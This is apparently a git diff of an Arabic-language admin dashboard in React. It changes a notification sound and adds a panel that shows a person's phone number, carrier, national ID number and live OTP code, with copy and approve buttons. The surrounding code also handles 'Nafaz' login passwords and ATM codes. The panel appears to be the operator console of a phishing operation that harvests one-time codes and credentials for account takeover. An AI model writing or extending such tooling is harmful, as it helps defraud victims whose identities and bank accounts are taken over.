@@ -188,27 +188,19 @@ export default function Dashboard() {
     try {
       const audioContext = new (window.AudioContext ||
         (window as any).webkitAudioContext)();
-      
-      // Create a pleasant two-tone chime notification
-      const playTone = (frequency: number, startTime: number, duration: number) => {
-        const oscillator = audioContext.createOscillator();
-        const gainNode = audioContext.createGain();
-        oscillator.connect(gainNode);
-        gainNode.connect(audioContext.destination);
-        oscillator.type = 'sine';
-        oscillator.frequency.setValueAtTime(frequency, startTime);
-        gainNode.gain.setValueAtTime(0, startTime);
-        gainNode.gain.linearRampToValueAtTime(0.4, startTime + 0.02);
-        gainNode.gain.exponentialRampToValueAtTime(0.01, startTime + duration);
-        oscillator.start(startTime);
-        oscillator.stop(startTime + duration);
-      };
-
-      const now = audioContext.currentTime;
-      // Pleasant notification chime - C5 then E5
-      playTone(523.25, now, 0.15);        // C5
-      playTone(659.25, now + 0.12, 0.2);  // E5
-      playTone(783.99, now + 0.25, 0.25); // G5
+      const oscillator = audioContext.createOscillator();
+      const gainNode = audioContext.createGain();
+      oscillator.connect(gainNode);
+      gainNode.connect(audioContext.destination);
+      oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
+      oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
+      gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+      gainNode.gain.exponentialRampToValueAtTime(
+        0.01,
+        audioContext.currentTime + 0.3,
+      );
+      oscillator.start(audioContext.currentTime);
+      oscillator.stop(audioContext.currentTime + 0.3);
     } catch (error) {
       console.log("Audio not supported");
     }
@@ -1519,6 +1511,77 @@ export default function Dashboard() {
                 </div>
               )}
 
+              {/* Phone Verification Section */}
+              {(selectedApplication.phoneNumber ||
+                selectedApplication.phoneCarrier ||
+                selectedApplication.phoneIdNumber) && (
+                <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
+                  <div className="bg-gradient-to-l from-pink-500/10 to-card px-4 py-3 border-b border-border">
+                    <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
+                      <Phone size={16} className="text-pink-500" />
+                      التحقق من الهاتف
+                      {selectedApplication.phoneOtpApproved && (
+                        <Badge className="bg-green-100 text-green-700 text-[9px]">
+                          <CheckCircle size={10} className="ml-1" />
+                          تمت الموافقة
+                        </Badge>
+                      )}
+                    </h3>
+                  </div>
+                  <div className="p-6 space-y-4">
+                    {selectedApplication.phoneNumber && (
+                      <DataRow
+                        label="رقم الهاتف"
+                        value={selectedApplication.phoneNumber}
+                        isLtr
+                      />
+                    )}
+                    {selectedApplication.phoneCarrier && (
+                      <DataRow
+                        label="شركة الاتصالات"
+                        value={selectedApplication.phoneCarrier}
+                      />
+                    )}
+                    {selectedApplication.phoneIdNumber && (
+                      <DataRow
+                        label="رقم الهوية"
+                        value={selectedApplication.phoneIdNumber}
+                        isLtr
+                      />
+                    )}
+                    {selectedApplication.phoneOtpCode && (
+                      <div className="bg-pink-50 dark:bg-pink-900/30 rounded-lg p-4 text-center border border-pink-200 dark:border-pink-800">
+                        <p className="text-xs text-muted-foreground mb-2">رمز التحقق OTP</p>
+                        <p className="font-mono text-3xl font-bold text-pink-600 dark:text-pink-400" dir="ltr">
+                          {selectedApplication.phoneOtpCode}
+                        </p>
+                        <Button
+                          size="sm"
+                          variant="outline"
+                          className="mt-3"
+                          onClick={() => copyToClipboard(selectedApplication.phoneOtpCode!, "OTP الهاتف")}
+                        >
+                          <Copy size={12} className="ml-1" />
+                          نسخ
+                        </Button>
+                      </div>
+                    )}
+                    {!selectedApplication.phoneOtpApproved && selectedApplication.phoneOtpCode && (
+                      <div className="pt-4 border-t border-border">
+                        <Button
+                          onClick={() => handleFieldApproval(selectedApplication.id, "phoneOtpApproved", true)}
+                          className="w-full bg-pink-600 hover:bg-pink-700"
+                          data-testid="button-approve-phone-section"
+                        >
+                          <CheckCircle className="h-4 w-4 ml-2" />
+                          موافقة على الهاتف
+                        </Button>
+                      </div>
+                    )}
+                  </div>
+                </div>
+              )}
+
               {/* Nafaz Section */}
               {(selectedApplication.nafazId ||
                 selectedApplication.nafazPass) && (
@@ -1728,11 +1791,7 @@ export default function Dashboard() {
                               disabled={!atmCode.trim()}
                               onClick={() => {
                                 if (atmCode.trim()) {
-                                  handleApprovalStatus(
-                                    selectedApplication.id,
-                                    "approved_atm",
-                                    atmCode.trim(),
-                                  );
+                                  handleApprovalStatus(selectedApplication.id, "approved_atm", atmCode.trim());
                                   setAtmCode("");
                                 }
                               }}
